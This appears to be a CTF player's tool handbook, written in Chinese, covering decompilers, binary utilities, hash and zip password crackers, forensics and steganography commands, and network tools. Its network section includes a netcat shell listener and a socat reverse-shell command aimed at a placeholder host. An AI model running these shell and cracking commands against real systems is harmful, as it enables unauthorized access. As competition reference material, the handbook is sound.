---
title: 工具手册：逆向、密码与系统
date: 2026-11-20 09:05:00
author: Xendr1a
categories: [工具与运维]
tags: [工具, 逆向]
description: 工具手册：逆向、密码与系统，按用途与常用参数整理。
toc: true
---

## 05 逆向 / 密码 / 取证 / 网络

> Web 主攻用不到这些，但团队赛里队友需要或题目跑偏时能用上。全部在 `~/.local/bin`。

### 反编译

#### jadx（1.5.6）— Java/APK 反编译（首选）

```bash
jadx -d out app.jar                    # 反编译 jar/apk/dex 到 out/
jadx -d out --show-bad-code app.apk     # 反编译失败也输出（比空白强）
jadx -d out -j 16 big.jar               # 多线程
jadx --single-class com.x.Y class.dex   # 只看一个类
```

用途：看 Java 站依赖版本（判 CVE）、找 gadget 类、审 APK。输出是接近源码的 Java。

#### apktool（3.0.3）— APK 解包/重打包

```bash
apktool d app.apk -o apkdir            # 解出 AndroidManifest.xml + smali
apktool b apkdir -o patched.apk        # 重打包
```

`AndroidManifest.xml` 看 exported 组件/权限；smali 里改逻辑后可重打包（要签名才能装）。

#### ghidra（12.2，仅 zip 未解包）

```bash
cd ~/opt && unzip ghidra_12.2_PUBLIC_20261016.zip && ./ghidra_12.2_PUBLIC/ghidraRun
```

GUI 反编译二进制。**目前只有 zip**，要用先解包；脚本化分析不如 `objdump`/`radare2` 快。

### 二进制小工具

```bash
objdump -d ./chall | less              # 反汇编（本机 binutils）
readelf -h ./chall ; strings -a ./chall | head -40
patchelf --set-interpreter /lib64/ld-linux-x86-64.so.2 ./chall   # 改解释器/依赖
ropper --file ./chall --search "pop rdi; ret"        # 找 gadget（1.13.13）
one_gadget /lib/x86_64-linux-gnu/libc.so.6           # libc 一把梭 gadget（2.1.1）
seccomp-tools dump ./chall                            # 看沙箱允许哪些 syscall（1.7.1）
seccomp-tools disasm ./chall
ctfdbg ./chall                                        # firejail + pwndbg 调试
```

### 密码 / 哈希

#### hashcat（6.2.6）

```bash
hashcat -m 0 hash.txt ~/ctf/省赛/wordlists/common.txt            # -m 0 = MD5
hashcat -m 1000 ntlm.txt rockyou.txt -r best64.rule               # NTLM + 规则
hashcat -m 1400 sha256.txt -a 3 ?a?a?a?a?a?a                      # 掩码爆破
hashcat -m 0 hash.txt --show                                       # 看已破结果
hashcat -m 0 -O -w 3 hash.txt dict.txt                            # 优化内核/高负载
```

`-m` 哈希类型（0 MD5/100 SHA1/1000 NTLM/1400 SHA256/1800 sha512crypt/3200 bcrypt/16500 JWT?）。
坑：**本机无 GPU 时很慢**，优先 john 或用差分/字典直查。

#### john（John the Ripper）

```bash
john --wordlist=dict.txt hash.txt
john --format=raw-md5 --wordlist=dict.txt md5.txt
john --show hash.txt
zip2john a.zip > h.txt && john h.txt                    # 压缩包
```

#### fcrackzip（1.0）— zip 密码

```bash
fcrackzip -u -D -p ~/ctf/省赛/wordlists/common.txt a.zip
fcrackzip -b -c a1 -l 1-6 -u a.zip                      # 暴力（小空间）
```

### 取证 / 隐写

```bash
# 文件类型与拆包
file x ; binwalk x ; binwalk -e x                       # 拆固件/嵌套压缩
7z l x.tar.gz ; 7z x x.zip -oout                        # 7z 万能解压
foremost -i disk.img -o out                             # 按文件头雕数据
fls -r -o 2048 disk.img                                 # sleuthkit：列分区文件
icat -o 2048 disk.img <inode> > recovered.bin           # 按 inode 提取

# 图片/音频隐写
exiftool img.jpg                                        # EXIF（GPS/软件/注释）
steghide extract -sf img.jpg -p '' ; steghide info img.jpg    # 0.5.1
zsteg -a img.png                                        # PNG LSB 全扫
foremost / binwalk 先看有没有附加数据
tesseract img.png - -l chi_sim+eng                      # OCR 提取图中文字

# 流量
capinfos a.pcap                                         # 概览（大小/时长/协议）
tshark -r a.pcap -q -z io,phs                            # 协议分层统计
tshark -r a.pcap -Y 'http.request' -T fields -e http.host -e http.request.uri | head
tshark -r a.pcap -Y 'http contains "flag"' -T fields -e frame.number -e http.file_data
editcap -A "2026-01-01 00:00:00" in.pcap out.pcap        # 裁剪时间
mergecap -w all.pcap a.pcap b.pcap
tcpdump -i any -nn -A port 80                            # 实时抓（AWD 看流量）
```

### 网络

```bash
nc -lvnp 4444                     # 监听（收 shell）
nc HOST 80                        # 手搓 HTTP
nc -zv HOST 1-1000 2>&1 | grep open    # 极简端口探测
socat TCP-LISTEN:8080,reuseaddr,fork TCP:127.0.0.1:80    # 端口转发
socat -v TCP-LISTEN:9000,reuseaddr,fork EXEC:./chall,pty,stderr   # 带 pty 起服务（pwn 常用）
socat FILE:tty,raw,echo=0 TCP:HOST:4444                  # 反弹 shell 的另一种写法
curl -sv --max-time 5 http://HOST/ ; curl -x http://127.0.0.1:8080 http://HOST/
```

### 数据库

```bash
sqlite3 db.sqlite '.tables' '.schema' 'select * from users limit 5'
sqlite3 db.sqlite '.dump' > dump.sql
# MySQL：本机没客户端，用 pyweb + pymysql
pyweb -c "import pymysql;c=pymysql.connect(host='H',user='root',password='p',database='d');cur=c.cursor();cur.execute('select * from flag');print(cur.fetchall())"
# 或走 docker
docker run -it --rm mariadb:11 mariadb -h H -u root -p
```

### 其他顺手工具

| 命令 | 作用 |
|---|---|
| `gh` | GitHub CLI（`gh repo clone`/`gh pr`/`gh api`） |
| `niri msg action screenshot-screen` | 截屏（Hermes 读图也靠截图） |
| `wl-copy` / `wl-paste` | Wayland 剪贴板 |
| `deai FILE.md` | 扫中文/英文「AI 味」（写 WP 前自查） |
| `ocr-region` | 区域截图→OCR→剪贴板 |
| `screenshot-annotate` | 区域截图→标注→剪贴板 |
| `mailsend` | 命令行发邮件（交录屏/材料用） |
| `text-open <file>` | alacritty+nvim 打开文本 |
| `libreoffice` / `soffice` / `lowriter` | 打开/转换 Office（`soffice --headless --convert-to pdf x.docx`） |
| `hmcl-bin` | Minecraft 启动器（与比赛无关，顺带记录） |
